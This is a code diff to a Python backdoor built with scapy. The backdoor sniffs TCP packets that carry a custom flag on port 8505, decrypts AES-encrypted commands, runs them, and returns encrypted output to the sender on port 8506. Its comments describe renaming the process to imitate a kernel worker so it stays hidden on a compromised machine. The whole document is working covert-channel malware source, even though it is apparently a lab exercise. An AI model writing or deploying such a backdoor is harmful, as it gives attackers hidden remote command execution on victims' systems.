@@ -7,12 +7,9 @@ from scapy.all import *
 from Crypto.Cipher import AES
 from Crypto import Random
 
-
-
-
 def usage():
-    if len(sys.argv) != 3:
-        print "To use: ", sys.argv[0], "[Server IP] [Client IP]"
+    if len(sys.argv) != 2:
+        print "To use: ", sys.argv[0] + "[Server Port]"
         sys.exit()
 
 def encryptCommand(message):
@@ -36,15 +33,15 @@ def decryptCommand(message):
     return decryptedData
 
 def server(pkt):
-    global srcIP
-    global destIP
     #Grab the source IP for each packets
-    src_ip = pkt[IP].src
     flagSet = pkt['TCP'].flags
+    dport = pkt[TCP].dport
     #key to authenticating the packet
     authPacket = "Authenticate packets"
-    if src_ip == destIP:
-        if flagSet == long(128):
+    #if src_ip == destIP:
+    if flagSet == long(128):
+        if dport == 8505:
+            src_ip = pkt[IP].src
             #Instantiate variables
             decryptedData=""
             newData = ""
@@ -59,7 +56,7 @@ def server(pkt):
                 #If we get exit command, exit out of the system
                 if newData == "exit":
                     encryptExit = encryptCommand(authPacket + newData)
-                    pkt = IP(src=str(srcIP), dst=str(destIP))/TCP(dport=8505, flags='C')/Raw(load=ecryptExit)
+                    pkt = IP(dst=str(src_ip))/TCP(dport=8506, flags='C')/Raw(load=encryptExit)
                     #Send the packet
                     send(pkt)
                     time.sleep(2)
@@ -71,23 +68,19 @@ def server(pkt):
                     #Encrypt the output and add the packet authenticator before sending back
                     encryptedReply = encryptCommand(authPacket + output)
                     #Create the output packet
-                    pkt = IP(src=str(srcIP), dst=str(destIP))/TCP(dport=8505, flags='C')/Raw(load=encryptedReply)
+                    pkt = IP(dst=str(src_ip))/TCP(dport=8506, flags='C')/Raw(load=encryptedReply)
                     #Send the packet
                     send(pkt)
             else:
-                print data
+                return
 
 if __name__ == "__main__":
-    global srcIP
-    global destIP
     usage()
-    #Arguments from command line
-    srcIP = sys.argv[1]
-    destIP = sys.argv[2]
+    destPort = sys.argv[1]
     #Change process name so that we can hide this program on a compromised machine
     #Make it look like a legitimate process running in the background
     #Usually we want to use something like kworker/2:1 to mask the program
-    title = "Backdoor"
+    title = "Backdoor Test"
     setproctitle.setproctitle(title)
     #Sniff for packets from the host
-    sniff(filter="tcp and host " + destIP + " and dst port 8505", prn=server)
+    sniff(filter="tcp and dst port " + destPort, prn=server)
